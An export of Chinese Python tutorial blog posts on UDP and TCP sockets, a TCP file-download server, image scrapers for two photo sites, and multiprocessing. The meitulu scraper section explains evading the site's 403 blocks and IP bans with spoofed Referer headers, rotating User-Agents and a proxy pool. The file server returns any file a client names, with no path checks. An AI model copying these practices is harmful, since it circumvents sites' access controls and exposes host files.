不用的时候，关闭套接字s.close()说明套接字使用流程 与 文件的使用流程很类似创建套接字使用套接字收/发数据关闭套接字udp网络程序-发送、接收数据udp网络程序-发送数据创建一个基于udp的网络程序流程很简单，具体步骤如下：1. 创建客户端套接字 2. 发送/接收数据 3. 关闭套接字 代码如下：1234567891011121314151617181920#coding=utf-8from socket import *# 1. 创建udp套接字udp_socket = socket(AF_INET, SOCK_DGRAM)# 2. 准备接收方的地址# '192.168.1.103'表示目的ip地址# 8080表示目的端口dest_addr = ('192.168.1.103', 8080) # 注意 是元组，ip是字符串，端口是数字# 3. 从键盘获取数据send_data = input("请输入要发送的数据:")# 4. 发送数据到指定的电脑上的指定程序中udp_socket.sendto(send_data.encode('utf-8'), dest_addr)# 5. 关闭套接字udp_socket.close()运行现象：在Ubuntu中运行脚本：在windows中运行“网络调试助手”：udp网络程序-发送、接收数据12345678910111213141516171819202122232425262728#coding=utf-8from socket import *# 1. 创建udp套接字udp_socket = socket(AF_INET, SOCK_DGRAM)# 2. 准备接收方的地址dest_addr = ('192.168.236.129', 8080)# 3. 从键盘获取数据send_data = input("请输入要发送的数据:")# 4. 发送数据到指定的电脑上udp_socket.sendto(send_data.encode('utf-8'), dest_addr)# 5. 等待接收对方发送的数据recv_data = udp_socket.recvfrom(1024) # 1024表示本次接收的最大字节数# 6. 显示对方发送的数据# 接收到的数据recv_data是一个元组# 第1个元素是对方发送的数据# 第2个元素是对方的ip和端口print(recv_data[0].decode('gbk'))print(recv_data[1])# 7. 关闭套接字udp_socket.close()python脚本：网络调试助手截图：python3编码转换12str-&gt;bytes:encode编码bytes-&gt;str:decode解码字符串通过编码成为字节码，字节码通过解码成为字符串。12345678910111213141516171819&gt;&gt;&gt; text = '我是文本'&gt;&gt;&gt; text'我是文本'&gt;&gt;&gt; print(text)我是文本&gt;&gt;&gt; bytesText = text.encode()&gt;&gt;&gt; bytesTextb'\xe6\x88\x91\xe6\x98\xaf\xe6\x96\x87\xe6\x9c\xac'&gt;&gt;&gt; print(bytesText)b'\xe6\x88\x91\xe6\x98\xaf\xe6\x96\x87\xe6\x9c\xac'&gt;&gt;&gt; type(text)&lt;class 'str'&gt;&gt;&gt;&gt; type(bytesText)&lt;class 'bytes'&gt;&gt;&gt;&gt; textDecode = bytesText.decode()&gt;&gt;&gt; textDecode'我是文本'&gt;&gt;&gt; print(textDecode)我是文本其中decode()与encode()方法可以接受参数，其声明分别为:12bytes.decode(encoding="utf-8", errors="strict")str.encode(encoding="utf-8", errors="strict")其中的encoding是指在解码编码过程中使用的编码(此处指“编码方案”是名词)，errors是指错误的处理方案。udp绑定信息udp网络程序-端口问题会变的端口号重新运行多次脚本，然后在“网络调试助手”中，看到的现象如下：说明：每重新运行一次网络程序，上图中红圈中的数字，不一样的原因在于，这个数字标识这个网络程序，当重新运行时，如果没有确定到底用哪个，系统默认会随机分配记住一点：这个网络程序在运行的过程中，这个就唯一标识这个程序，所以如果其他电脑上的网络程序如果想要向此程序发送数据，那么就需要向这个数字（即端口）标识的程序发送即可udp绑定信息绑定信息一般情况下，在一台电脑上运行的网络程序有很多，为了不与其他的网络程序占用同一个端口号，往往在编程中，udp的端口号一般不绑定但是如果需要做成一个服务器端的程序的话，是需要绑定的，想想看这又是为什么呢？如果报警电话每天都在变，想必世界就会乱了，所以一般服务性的程序，往往需要一个固定的端口号，这就是所谓的端口绑定绑定示例12345678910111213141516171819#coding=utf-8from socket import *# 1. 创建套接字udp_socket = socket(AF_INET, SOCK_DGRAM)# 2. 绑定本地的相关信息，如果一个网络程序不绑定，则系统会随机分配local_addr = ('', 7788) # ip地址和端口号，ip一般不用写，表示本机的任何一个ipudp_socket.bind(local_addr)# 3. 等待接收对方发送的数据recv_data = udp_socket.recvfrom(1024) # 1024表示本次接收的最大字节数# 4. 显示接收到的数据print(recv_data[0].decode('gbk'))# 5. 关闭套接字udp_socket.close()运行结果：总结:一个udp网络程序，可以不绑定，此时操作系统会随机进行分配一个端口，如果重新运行此程序端口可能会发生变化一个udp网络程序，也可以绑定信息（ip地址，端口号），如果绑定成功，那么操作系统用这个端口号来进行区别收到的网络数据是否是此进程的网络通信过程(简单版)网络通信过程中，之所需要ip、port等，就是为了能够将一个复杂的通信过程进行任务划分，从而保证数据准确无误的传递应用：udp聊天器说明在一个电脑中编写1个程序，有2个功能1.获取键盘数据，并将其发送给对方2.接收数据并显示并且功能数据进行选择以上的2个功能调用参考代码:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#coding=utf-8import socketdef send_msg(udp_socket): """获取键盘数据，并将其发送给对方""" # 1. 从键盘输入数据 msg = input("\n请输入要发送的数据:") # 2. 输入对方的ip地址 dest_ip = input("\n请输入对方的ip地址:") # 3. 输入对方的port dest_port = int(input("\n请输入对方的port:")) # 4. 发送数据 udp_socket.sendto(msg.encode("utf-8"), (dest_ip, dest_port))def recv_msg(udp_socket): """接收数据并显示""" # 1. 接收数据 recv_msg = udp_socket.recvfrom(1024) # 2. 解码 recv_ip = recv_msg[1] recv_msg = recv_msg[0].decode("utf-8") # 3. 显示接收到的数据 print("&gt;&gt;&gt;%s:%s" % (str(recv_ip), recv_msg))def main(): # 1. 创建套接字 udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 2. 绑定本地信息 udp_socket.bind(("", 7890)) while True: # 3. 选择功能 print("="*30) print("1:发送消息") print("2:接收消息") print("="*30) op_num = input("请输入要操作的功能序号:") # 4. 根据选择调用相应的函数 if op_num == "1": send_msg(udp_socket) elif op_num == "2": recv_msg(udp_socket) else: print("输入有误，请重新输入...")if __name__ == "__main__": main()想一想以上的程序如果选择了接收数据功能，并且此时没有数据，程序会堵塞在这，那么怎样才能让这个程序收发数据一起进行呢？]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>udp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络_tcp]]></title>
    <url>%2F2019%2F12%2F31%2F%E7%BD%91%E7%BB%9C_tcp%2F</url>
    <content type="text"><![CDATA[TCP简介TCP介绍TCP协议，传输控制协议（英语：Transmission Control Protocol，缩写为 TCP）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793定义。TCP通信需要经过创建连接、数据传送、终止连接三个步骤。TCP通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，”打电话””TCP特点面向连接通信双方必须先建立连接才能进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输。双方间的数据传输都可以通过这一个连接进行。完成数据交换后，双方必须断开此连接，以释放系统资源。这种连接是一对一的，因此TCP不适用于广播的应用程序，基于广播的应用程序请使用UDP协议。可靠传输TCP采用发送应答机制TCP发送的每个报文段都必须得到接收方的应答才认为这个TCP报文段传输成功超时重传发送端发出一个报文段之后就启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段。TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。错误校验TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。流量控制和阻塞管理流量控制用来避免主机发送得过快而使接收方来不及完全收下。TCP与UDP的不同点面向连接（确认有创建三方交握，连接已创建才作传输。）有序数据传输重发丢失的数据包舍弃重复的数据包无差错的数据传输阻塞/流量控制udp通信模型udp通信模型中，在通信开始之前，不需要建立相关的链接，只需要发送数据即可，类似于生活中，”写信””TCP通信模型tcp通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，”打电话””tcp客户端所谓的服务器端：就是提供服务的一方，而客户端，就是需要被服务的一方tcp客户端构建流程tcp的客户端要比服务器端简单很多，如果说服务器端是需要自己买手机、查手机卡、设置铃声、等待别人打电话流程的话，那么客户端就只需要找一个电话亭，拿起电话拨打即可，流程要少很多示例代码：1234567891011121314151617181920212223from socket import *# 创建sockettcp_client_socket = socket(AF_INET, SOCK_STREAM)# 目的信息server_ip = input("请输入服务器ip:")server_port = int(input("请输入服务器port:"))# 链接服务器tcp_client_socket.connect((server_ip, server_port))# 提示用户输入数据send_data = input("请输入要发送的数据：")tcp_client_socket.send(send_data.encode("gbk"))# 接收对方发送过来的数据，最大接收1024个字节recvData = tcp_client_socket.recv(1024)print('接收到的数据为:', recvData.decode('gbk'))# 关闭套接字tcp_client_socket.close()运行流程tcp客户端1234请输入服务器ip:10.10.0.47请输入服务器port:8080请输入要发送的数据：你好啊接收到的数据为: 我很好，你呢网络调试助手tcp服务器在程序中，如果想要完成一个tcp服务器的功能，需要的流程如下：socket创建一个套接字bind绑定ip和portlisten使套接字变为可以被动链接accept等待客户端的链接recv/send接收发送数据一个很简单的tcp服务器如下：12345678910111213141516171819202122232425262728from socket import *# 创建sockettcp_server_socket = socket(AF_INET, SOCK_STREAM)# 本地信息address = ('', 7788)# 绑定tcp_server_socket.bind(address)# 使用socket创建的套接字默认的属性是主动的，使用listen将其变为被动的，这样就可以接收别人的链接了tcp_server_socket.listen(128)# 如果有新的客户端来链接服务器，那么就产生一个新的套接字专门为这个客户端服务# client_socket用来为这个客户端服务# tcp_server_socket就可以省下来专门等待其他新客户端的链接client_socket, clientAddr = tcp_server_socket.accept()# 接收对方发送过来的数据recv_data = client_socket.recv(1024) # 接收1024个字节print('接收到的数据为:', recv_data.decode('gbk'))# 发送一些数据到客户端client_socket.send("thank you !".encode('gbk'))# 关闭为这个客户端服务的套接字，只要关闭了，就意味着为不能再为这个客户端服务了，如果还需要服务，只能再次重新连接client_socket.close()运行流程tcp服务器1接收到的数据为: 你在么？网络调试助手tcp注意点tcp服务器一般情况下都需要绑定，否则客户端找不到这个服务器tcp客户端一般不绑定，因为是主动链接服务器，所以只要确定好服务器的ip、port等信息就好，本地客户端可以随机tcp服务器中通过listen可以将socket创建出来的主动套接字变为被动的，这是做tcp服务器时必须要做的当客户端需要链接服务器时，就需要使用connect进行链接，udp是不需要链接的而是直接发送，但是tcp必须先链接，只有链接成功才能通信当一个tcp客户端连接服务器时，服务器端会有1个新的套接字，这个套接字用来标记这个客户端，单独为这个客户端服务listen后的套接字是被动套接字，用来接收新的客户端的链接请求的，而accept返回的新套接字是标记这个新客户端的关闭listen后的套接字意味着被动套接字关闭了，会导致新的客户端不能够链接服务器，但是之前已经链接成功的客户端正常通信。关闭accept返回的套接字意味着这个客户端已经服务完毕当客户端的套接字调用close后，服务器端会recv解堵塞，并且返回的长度为0，因此服务器可以通过返回数据的长度来区别客户端是否已经下线案例:文件下载器服务器 参考代码如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from socket import *import sysdef get_file_content(file_name): """获取文件的内容""" try: with open(file_name, "rb") as f: content = f.read() return content except: print("没有下载的文件:%s" % file_name)def main(): if len(sys.argv) != 2: print("请按照如下方式运行：python3 xxx.py 7890") return else: # 运行方式为python3 xxx.py 7890 port = int(sys.argv[1]) # 创建socket tcp_server_socket = socket(AF_INET, SOCK_STREAM) # 本地信息 address = ('', port) # 绑定本地信息 tcp_server_socket.bind(address) # 将主动套接字变为被动套接字 tcp_server_socket.listen(128) while True: # 等待客户端的链接，即为这个客户端发送文件 client_socket, clientAddr = tcp_server_socket.accept() # 接收对方发送过来的数据 recv_data = client_socket.recv(1024) # 接收1024个字节 file_name = recv_data.decode("utf-8") print("对方请求下载的文件名为:%s" % file_name) file_content = get_file_content(file_name) # 发送文件的数据给客户端 # 因为获取打开文件时是以rb方式打开，所以file_content中的数据已经是二进制的格式，因此不需要encode编码 if file_content: client_socket.send(file_content) # 关闭这个套接字 client_socket.close() # 关闭监听套接字 tcp_server_socket.close()if __name__ == "__main__": main()客户端 参考代码如下:123456789101112131415161718192021222324252627282930313233from socket import *def main(): # 创建socket tcp_client_socket = socket(AF_INET, SOCK_STREAM) # 目的信息 server_ip = input("请输入服务器ip:") server_port = int(input("请输入服务器port:")) # 链接服务器 tcp_client_socket.connect((server_ip, server_port)) # 输入需要下载的文件名 file_name = input("请输入要下载的文件名：") # 发送文件下载请求 tcp_client_socket.send(file_name.encode("utf-8")) # 接收对方发送过来的数据，最大接收1024个字节（1K） recv_data = tcp_client_socket.recv(1024) # print('接收到的数据为:', recv_data.decode('utf-8')) # 如果接收到数据再创建文件，否则不创建 if recv_data: with open("[接收]"+file_name, "wb") as f: f.write(recv_data) # 关闭套接字 tcp_client_socket.close()if __name__ == "__main__": main()tcp的3次握手tcp的4次挥手tcp长连接和短连接TCP在真正的读写操作之前，server与client之间必须建立一个连接，当读写操作完成后，双方不再需要这个连接时它们可以释放这个连接，连接的建立通过三次握手，释放则需要四次握手，所以说每个连接的建立都是需要资源消耗和时间消耗的。TCP通信的整个过程，如下图:TCP短连接模拟一种TCP短连接的情况:1. client 向 server 发起连接请求 2. server 接到请求，双方建立连接 3. client 向 server 发送消息 4. server 回应 client 5. 一次读写完成，此时双方任何一个都可以发起 close 操作 在步骤5中，一般都是 client 先发起 close 操作。当然也不排除有特殊的情况。从上面的描述看，短连接一般只会在 client/server 间传递一次读写操作！TCP长连接再模拟一种长连接的情况:1. client 向 server 发起连接 2. server 接到请求，双方建立连接 3. client 向 server 发送消息 4. server 回应 client 5. 一次读写完成，连接不关闭 6. 后续读写操作... 7. 长时间操作之后client发起关闭请求 TCP长/短连接操作过程短连接的操作步骤是：建立连接——数据传输——关闭连接…建立连接——数据传输——关闭连接长连接的操作步骤是：建立连接——数据传输…（保持连接）…数据传输——关闭连接TCP长/短连接的优点和缺点长连接可以省去较多的TCP建立和关闭的操作，减少浪费，节约时间。对于频繁请求资源的客户来说，较适用长连接。client与server之间的连接如果一直不关闭的话，会存在一个问题，随着客户端连接越来越多，server早晚有扛不住的时候，这时候server端需要采取一些策略，如关闭一些长时间没有读写事件发生的连接，这样可以避免一些恶意连接导致server端服务受损；如果条件再允许就可以以客户端机器为颗粒度，限制每个客户端的最大长连接数，这样可以完全避免某个蛋疼的客户端连累后端服务。短连接对于服务器来说管理较为简单，存在的连接都是有用的连接，不需要额外的控制手段。但如果客户请求频繁，将在TCP的建立和关闭操作上浪费时间和带宽。TCP长/短连接的应用场景长连接多用于操作频繁，点对点的通讯，而且连接数不能太多情况。每个TCP连接都需要三次握手，这需要时间，如果每个操作都是先连接，再操作的话那么处理速度会降低很多，所以每个操作完后都不断开，再次处理时直接发送数据包就OK了，不用建立TCP连接。例如：数据库的连接用长连接，如果用短连接频繁的通信会造成socket错误，而且频繁的socket 创建也是对资源的浪费。而像WEB网站的http服务一般都用短链接，因为长连接对于服务端来说会耗费一定的资源，而像WEB网站这么频繁的成千上万甚至上亿客户端的连接用短连接会更省一些资源，如果用长连接，而且同时有成千上万的用户，如果每个用户都占用一个连接的话，那可想而知吧。所以并发量大，但每个用户无需频繁操作情况下需用短链接好。tcp-ip简介什么是协议为了解决不同种族人之间的语言沟通障碍，现规定国际通用语言是英语，这就是一个规定，这就是协议计算机网络沟通用什么不同的计算机只需要能够联网（有线无线都可以）那么就可以相互进行传递数据就像说不同语言的人沟通一样，只要有一种大家都认可都遵守的协议即可，那么这个计算机都遵守的网络通信协议叫做TCP/IP协议TCP/IP协议(族)为了把全世界的所有不同类型的计算机都连接起来，就必须规定一套全球通用的协议，为了实现互联网这个目标，互联网协议族（Internet Protocol Suite）就是通用协议标准。因为互联网协议包含了上百种协议标准，但是最重要的两个协议是TCP和IP协议，所以，大家把互联网的协议简称TCP/IP协议(族)常用的网络协议如下图所示：说明：网际层也称为：网络层网络接口层也称为：链路层另外一套标准:]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>tcp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取干货集中营的图片]]></title>
    <url>%2F2019%2F12%2F31%2F%E7%88%AC%E5%8F%96%E5%B9%B2%E8%B4%A7%E9%9B%86%E4%B8%AD%E8%90%A5%E7%9A%84%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[网站地址http://gank.io/ 分析网站网站地址:https://gank.io/, 要爬取的是网站首页上展示出来的图片 在网站首页底部左上角有API地址,点击进入到干货集中营 API 文档 其中有这样的内容显示,如下图： 尝试访问:https://gank.io/api/data/福利/10/1, 出来如下的json数据： 通过API文档描述,可以知道链接地址中的请求个数和请求页数,获取到所有的图片信息。 比如:https://gank.io/api/data/福利/700/1, 请求700条数据,获取第一页,发现返回的结果中总共有670条数据(截止到20190314),第二页没有数据. 再次请求:https://gank.io/api/data/福利/600/1, 请求600条数据,获取第一页,发现确实有600条数据, 然后再请求第二页(https://gank.io/api/data/福利/600/2),有70条数据。 结合以上分析,截止到今天(20190314),共有670条数据,避免使用翻页的情况,就直接使用如下网址获取全部数据:https://gank.io/api/data/福利/700/1 根据获取到的son数据,提取出所需要的图片链接,最后下载这些图片并保存. 实际代码#!/usr/bin/env python # -*- coding: utf-8 -*- import datetime import os from _md5 import md5 import requests from requests import RequestException def get_one_page(url): try: response = requests.get(url) if response.status_code == 200: return response.json() except: return None def utc_to_local(utc_time_str, utc_format=&apos;%Y-%m-%dT%H:%M:%S.%fZ&apos;): &quot;&quot;&quot; &quot;2015-06-05T03:54:29.403Z&quot;格式的时间转换成2015-06-05 11:54:29 &quot;&quot;&quot; local_format = &quot;%Y-%m-%d %H:%M:%S&quot; utc_dt = datetime.datetime.strptime(utc_time_str, utc_format) local_dt = utc_dt + datetime.timedelta(hours=8) time_str = local_dt.strftime(local_format) return time_str def https_to_http(url): &quot;&quot;&quot; 把图片链接是https的换成http &quot;&quot;&quot; if url[0:5] == &apos;https&apos;: url = url.replace(url[0:5], &apos;http&apos;) return url def parse_one_page(html): items = html[&apos;results&apos;] for item in items: yield { &apos;id&apos;: item[&apos;_id&apos;], &apos;publishedAt&apos;: utc_to_local(item[&apos;publishedAt&apos;]), &apos;url&apos;: https_to_http(item[&apos;url&apos;]) } # 请求图片url,获取图片二进制数据 def download_image(url): try: response = requests.get(url) if response.status_code == 200: save_image(response.content) # response.contenter二进制数据 response.text文本数据 return None except RequestException: print(&apos;请求图片出错&apos;, url) return None def save_image(content): &quot;&quot;&quot; 需要提前建好目录D:\\pachong\\gank1\\ &quot;&quot;&quot; file_path = &apos;D:\\pachong\\gank1\\{1}.{2}&apos;.format(os.getcwd(), md5(content).hexdigest(), &apos;jpg&apos;) if not os.path.exists(file_path): with open(file_path, &apos;wb&apos;) as f: f.write(content) def main(): url = &apos;http://gank.io/api/data/福利/700/1&apos; html = get_one_page(url) for item in parse_one_page(html): download_image(item[&apos;url&apos;]) if __name__ == &apos;__main__&apos;: main() 结果分析总共700条json数据,实际只有564条数据,通过分析获取到的图片url,发现有些图片url链接本身已失效,使用浏览器打开这些图片链接会报如下错误: 失效链接展示: 实际结果：]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>美女</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取美图录网站图片]]></title>
    <url>%2F2019%2F12%2F31%2F%E7%88%AC%E5%8F%96%E7%BE%8E%E5%9B%BE%E5%BD%95%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[网站地址https://www.meitulu.com/ 分析该网站1. 打开网站地址后，查看网站右侧导航菜单，目标是提取出爬取网站图片所需的链接地址，这些链接地址最好是包含整个网站的链接地址。 2. 随便点开一个图集分类下的类别，比如&quot;女神&quot;，，进入到的链接地址是：https://www.meitulu.com/t/nvshen/. 3. 从中随便选一个图集点开，进入到该图集的详情页面。上面显示的该图集的相关信息，下面显示的是该图集的每张图片。 右上角显示的是该图集的当前位置。注意这个当前位置。 4. 再从图集类别中选一个进入到该图集的详情页面，发现右上角也有当前位置。 5. 点击导航菜单中的精选美女，进入到某一个图集详情页面，发现右上角也有当前位置。 6. 点击导航菜单中的日韩美女，进入到某一个图集详情页面，发现右上角也有当前位置。 7. 经过以上分析可知，该网站的图集分为如下三大类：日韩美女，港台美女和国产美女。图集分类中是每一个图集的标签汇总。 8. 提取出图集三大类的地址如下： 日韩美女：https://www.meitulu.com/rihan/, 港台美女：https://www.meitulu.com/gangtai/， 国产美女：https://www.meitulu.com/guochan/, 经查看这三个网址，只有最后的不一样，前面的网址等都是一样的，可以构造列表来遍历循环使用，[&apos;rihan&apos;,&apos;gangtai&apos;,&apos;guochan&apos;] 9. 假如进入国产美女里。通过分析页面信息，每一个图集信息都是在一个li标签里，可以使用正则表达式提取出这些li标签。 10.点击其中一个图集，其链接是：https://www.meitulu.com/item/16889.html, 进入到该图集的详情页面. 最上面显示该图集的图片共有96张，每页显示4张图片，拉到最后的第24页，24*4=96张。 10.查看该图集下的每一个图片链接，发现是在一个img标签里，第一个的4张图片地址依次是： https://mtl.ttsqgs.com/images/img/16889/1.jpg， https://mtl.ttsqgs.com/images/img/16889/2.jpg， https://mtl.ttsqgs.com/images/img/16889/3.jpg， https://mtl.ttsqgs.com/images/img/16889/4.jpg， 最后24页的4张图片地址链接是：https://www.meitulu.com/item/16889_24.html， 每一个图片的地址依次是： https://mtl.ttsqgs.com/images/img/16889/93.jpg， https://mtl.ttsqgs.com/images/img/16889/94.jpg， https://mtl.ttsqgs.com/images/img/16889/95.jpg， https://mtl.ttsqgs.com/images/img/16889/96.jpg 同时页面显示的有&quot;美图录提示：点击图片，查看原尺寸高清大图&quot;,js代码是: function() { window.open(&quot;/img.html?img=&quot; + this.src + &quot;&quot;) } 点击图片进入原尺寸高清大图，复制出网址如下：https://www.meitulu.com/img.html?img=https://mtl.ttsqgs.com/images/img/16889/1.jpg。 11. 分析第10步的图片链接，可以发现： (1)图集链接地址(https://www.meitulu.com/item/16889.html)中的数字16889跟该图集中的每一个张图片的链接地址(https://mtl.ttsqgs.com/images/img/16889/1.jpg)相关. (2)每一个图片的链接地址最后的数字是从1开始的，一直到该图集的总数第96 (2)图集详情页中的图片总数跟图集分页数有关，图片总数除以4，若有余数再加1，得到的数字就是该图集的分页数。 (3)该图集的链接地址也有规律，比如图集的第一页地址是：https://www.meitulu.com/item/16889.html， 第二页的是：https://www.meitulu.com/item/16889_2.html， 最后第24页的是：https://www.meitulu.com/item/16889_24.html。 (4)经过以上分析，优先采用(1)和(2)中得到的规律，提取出每一个图集的名称，图集的链接和图片总数，然后构造该图集下的每一个图片的链接。 (5)图集的链接也有规律，比如国产美女分类，第一页的地址是：https://www.meitulu.com/guochan/， 第二页的地址是：https://www.meitulu.com/guochan/2.html， 第164页的地址是：https://www.meitulu.com/guochan/164.html。 可以采用遍历的方式。 实际操作中的坑1. 使用requests的get方式请求每一个图片的链接，得到的图片是损坏的，向群里其他人请教得知，请求是需要加上headers头部信息，必须有Referer，且Referer参数值还有要求，比如说某张图片的图片地址是：https://mtl.ttsqgs.com/images/img/16889/13.jpg， 则Referer的值是https://www.meitulu.com/img.html?img=https://mtl.ttsqgs.com/images/img/16889/13.jpg， 注意查看这俩网址之间的关系。 2. 请求次数过多会报403 Forbidden，通过使用模块fake_useragent生成随机的User-Agent信息。可以解决一小部分情况，时间一长还是会再次报403 Forbidden，只能再次随机生成不同的User-Agent值。 3. 时间长的话会出现这样一个情况，往后的每个图集只能下载保存前9张图片，以后的图片访问请求均报403 Forbidden，这个估计是封IP了，所以还需要使用代理才行。 4. 在网上找到的一个能用的代理软件，地址是：https://github.com/chenjiandongx/async-proxy-pool， 若使用的redis版本低于3.0，则代理池代码可以直接运行使用，若高于3.0版本，则需要修改其中一个文件，具体如下：async_proxy_pool/database.py，修改其中的第45行，原先是self.redis.zadd(REDIS_KEY, proxy, score)，修改成：self.redis.zadd(REDIS_KEY, ｛proxy： score｝)。 5. 使用代理 (1)运行客户端，启动收集器和校验器：python3 client.py (2)运行服务器，启动 web 服务:python3 server_flask.py (3)获取代理地址信息 import requests proxy = requests.get(&apos;http://192.168.0.200:3289/pop&apos;) proxies = proxy.json() print(proxies) (4)爬虫代码中使用代理 跟(3)合二为一 import requests proxy = requests.get(&apos;http://192.168.0.200:3289/pop&apos;) requests.get(&quot;http://example.org&quot;, proxies=proxies) 实际代码#!/usr/bin/env python # -*- coding: utf-8 -*- import os import random import re import requests from fake_useragent import UserAgent from requests.exceptions import RequestException ​# 获取三大分类页面详细数据 def get_one_page(url): try: response = requests.get(url) if response.status_code == 200: response.encoding = &apos;utf8&apos; return response.text else: return None except RequestException: print(&apos;请求失败&apos;) return None ​# 解析三大分类页面数据，提取需要的数据 def parse_one_page(html): pattern = re.compile(&apos;&lt;li&gt;.*?&lt;p&gt;数量： (.*?) 张&lt;/p&gt;.*?&lt;p class=p_title&gt;&lt;a href=&quot;(.*?)&quot;.*?&gt;(.*?)&lt;/a&gt;&lt;/p&gt;.*?&lt;/li&gt;&apos;, re.S | re.M) items = re.findall(pattern, html) for i in range(len(items)): yield { &apos;num&apos;: int(items[i][0]), # 获取图集的图片总数 &apos;name&apos;: items[i][2], # 获取图集名称 &apos;url&apos;: items[i][1].split(&apos;/&apos;)[4][:-5], # 获取图集id } ​# 获取随机请求头 def GetUserAgent(): ua = UserAgent() return random.choice([ua.safari, ua.firefox, ua.chrome, ua.opera, ua.ie, ua.random]) ​# 获取随机代理地址,因爬取速度慢，暂不使用 def GetProxy(): proxy = requests.get(&apos;http://192.168.0.200:3289/pop&apos;) proxies = proxy.json() return proxies ​# 请求图片链接地址 def download_image(item): try: file_path = item[&apos;name&apos;] # 获取图集名称 id = item[&apos;url&apos;] # 获取图集id num = item[&apos;num&apos;] # 获取图集的图片总数 for i in range(1, num + 1): url = f&apos;https://mtl.ttsqgs.com/images/img/{id}/{i}.jpg&apos; # 使用f-string的方式拼接字符串 headers = { # 构造请求头 &apos;User-Agent&apos;: GetUserAgent(), &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,en-US;q=0.8,zh;q=0.5,en;q=0.3&apos;, &apos;Referer&apos;: &apos;https://www.meitulu.com/img.html?img=%s&apos; % url, } yield { &apos;name&apos;: file_path, &apos;headers&apos;: headers, &apos;i&apos;: i, &apos;url&apos;: url, &apos;num&apos;: num } except RequestException: print(&apos;请求图片出错&apos;) return None ​# 保存图片，使用第三方错误重试模块，该模块需要导入 # @retry(stop_max_attempt_number=3) def save_image(path, x): name = x[&apos;name&apos;] i = x[&apos;i&apos;] headers = x[&apos;headers&apos;] url = x[&apos;url&apos;] num = x[&apos;num&apos;] base_path = f&apos;{os.getcwd()}{os.sep}{path}{os.sep}{name}&apos; if not os.path.exists(base_path): os.makedirs(base_path) save_path = f&apos;{base_path}{os.sep}{i}.jpg&apos; if not os.path.exists(save_path): try: requests.packages.urllib3.disable_warnings() response = requests.get(url, headers=headers, verify=False) except: print(f&apos;请求{name}图集的第{i}张图片链接地址失败,共{num}张,图片链接是{url}&apos;) else: if response.status_code == 200: try: with open(save_path, &apos;wb&apos;) as f: f.write(response.content) print(f&apos;保存{name}图集的第{i}张图片成功,共{num}张&apos;) except: print(f&apos;保存{name}图集的第{i}张图片失败,共{num}张,图片链接是{url}&apos;) else: print(f&apos;请求{name}图集的第{i}张图片链接地址状态不是200,共{num}张,图片链接是{url}&apos;) else: print(f&apos;{name}图集文件夹已存在,请求一下图集&apos;) # 遍历三大分类 def img_url(): img_ict = {&apos;rihan&apos;: 88, &apos;gangtai&apos;: 36, &apos;guochan&apos;: 165} for k, v in img_ict.items(): yield { &apos;name&apos;: k, &apos;num&apos;: v } # 新传分类名称 def main(): for img_u in img_url(): for i in range(1, img_u[&apos;num&apos;]): if i == 1: url = f&apos;https://www.meitulu.com/{img_u[&quot;name&quot;]}/&apos; else: url = f&apos;https://www.meitulu.com/{img_u[&quot;name&quot;]}/{i}.html&apos; html = get_one_page(url) for item in parse_one_page(html): for x in download_image(item): save_image(img_u[&apos;name&apos;], x) ​if name == ‘main‘:main()效果展示]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>美女</tag>
        <tag>requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多任务_进程]]></title>
    <url>%2F2019%2F12%2F31%2F%E5%A4%9A%E4%BB%BB%E5%8A%A1_%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[进程以及状态进程程序：例如xxx.py这是程序，是一个静态的进程：一个程序运行起来后，代码+用到的资源 称之为进程，它是操作系统分配资源的基本单元。不仅可以通过线程完成多任务，进程也是可以的进程的状态工作中，任务数往往大于cpu的核数，即一定有一些任务正在执行，而另外一些任务在等待cpu进行执行，因此导致了有了不同的状态就绪态：运行的条件都已经慢去，正在等在cpu执行执行态：cpu正在执行其功能等待态：等待某些条件满足，例如一个程序sleep了，此时就处于等待态进程的创建-multiprocessingmultiprocessing模块就是跨平台版本的多进程模块，提供了一个Process类来代表一个进程对象，这个对象可以理解为是一个独立的进程，可以执行另外的事情2个while循环一起执行1234567891011121314151617from multiprocessing import Processimport timedef run_proc(): """子进程要执行的代码""" while True: print("----2----") time.sleep(1)if __name__=='__main__': p = Process(target=run_proc) p.start() while True: print("----1----") time.sleep(1)说明创建子进程时，只需要传入一个执行函数和函数的参数，创建一个Process实例，用start()方法启动进程pid12345678910111213from multiprocessing import Processimport osimport timedef run_proc(): """子进程要执行的代码""" print('子进程运行中，pid=%d...' % os.getpid()) # os.getpid获取当前进程的进程号 print('子进程将要结束...')if __name__ == '__main__': print('父进程pid: %d' % os.getpid()) # os.getpid获取当前进程的进程号 p = Process(target=run_proc) p.start()Process语法结构Process([group [, target [, name [, args [, 